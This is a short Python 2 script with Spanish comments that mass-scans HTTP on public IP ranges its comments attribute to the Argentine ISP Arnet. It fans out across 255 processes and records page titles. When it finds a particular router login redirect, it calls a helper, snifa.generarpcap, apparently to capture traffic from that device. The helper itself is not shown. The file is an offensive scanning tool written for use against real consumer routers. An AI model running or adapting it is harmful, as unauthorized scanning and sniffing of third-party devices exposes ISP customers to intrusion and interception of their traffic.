from multiprocessing import Process
import mechanize
import BeautifulSoup
import sys
import os
import time
import snifa

from colores import color

b = mechanize.Browser()

# ips de arnet 181.96.0.0 - 181.111.255.255
# anduvo mucho tiempo en ip = "http://201.253." + str(j) + "."
# print chr(27) + "[2J" # para borrar pantalla

miip = snifa.miip()

def buscar(ip):
    global miip
    for j in range(110,112):
        # 186.153.255.140
        ip = "http://181." + str(j) + "." + str(ip) + "."
        lista = []
        timeout = 1
        for i in range(0,255):
            try:
                r = b.open(ip + str(i),timeout=timeout)
                pagina = BeautifulSoup.BeautifulSoup(r)
            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except:
                continue
            titulo = str(pagina.find("title"))
            if not titulo:
                titulo = "no hay titulo"
            titulo = titulo.replace("<title>","")
            titulo = titulo.replace("</title>","")
            
            print color.azul + ip + str(i) + "\t\t" + titulo.replace("\n","") + color.fin
            lista.append(ip + str(i))
            try:
                if str(pagina.text) == "parent.location='%s/login.html'" % (ip + str(i)):
                    print color.amarillo + "*************snifo!!****************" + color.fin
                    try:
                        snifa.generarpcap(ip + str(i),miip)
                    except Exception as inst:
                        print color.rojo + "!!!!!!!!!!!!!!!ERROR!! con %s" % (ip + str(i)) + color.fin
                        print color.rojo + inst.message + color.fin
            except UnicodeEncodeError:
                pass


if __name__ == '__main__':
    #print color.amarillo + "No te olvides de poner tu ip en snifa.py!" + color.fin
    procesos = []
    for i in range(255):
        procesos.append(Process(target=buscar, args=(255 - i,)))
        time.sleep(1.0/100.0)
        procesos[-1].start()
    while any([p.is_alive() for p in procesos]):
        try:
            pass
        except KeyboardInterrupt:
            for p in procesos:
                p.terminate()
            sys.exit(0)



